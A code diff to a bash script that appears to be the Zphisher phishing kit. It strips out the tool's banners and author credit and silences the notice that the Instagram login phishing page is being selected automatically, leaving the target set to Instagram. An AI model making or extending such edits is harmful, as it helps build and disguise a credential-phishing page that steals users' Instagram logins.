@@ -110,29 +110,12 @@ check_status() {
 
 ## Banner
 banner() {
-	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
-
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
-	EOF
+	echo ""
 }
 
 ## Small Banner
 banner_small() {
-	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
-	EOF
+	echo ""
 }
 
 ## Dependencies
@@ -669,11 +652,7 @@ site_vk() {
 
 ## Menu
 main_menu() {
-	{ clear; banner; echo; }
-	
-	# Automatically select Instagram Traditional Login Page
-	echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Auto-selecting: ${ORANGE}Instagram Traditional Login Page${WHITE}\n"
-	sleep 1
+	clear
 	
 	# Set website and mask for Instagram traditional page
 	website="instagram"
